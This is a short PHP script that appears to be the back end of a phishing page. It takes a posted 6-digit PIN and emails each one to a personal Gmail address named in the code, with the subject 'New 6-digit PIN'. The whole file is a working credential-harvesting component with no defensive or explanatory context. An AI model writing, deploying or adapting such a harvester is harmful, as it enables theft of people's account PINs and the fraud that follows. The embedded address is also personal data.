<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $pin = $_POST["pin"];
    $to = "rofiq8429@gmail.com";
    $subject = "New 6-digit PIN";
    $message = "The entered PIN is: " . $pin;
    $headers = "From: noreply@example.com";

    mail($to, $subject, $message, $headers);
}
?>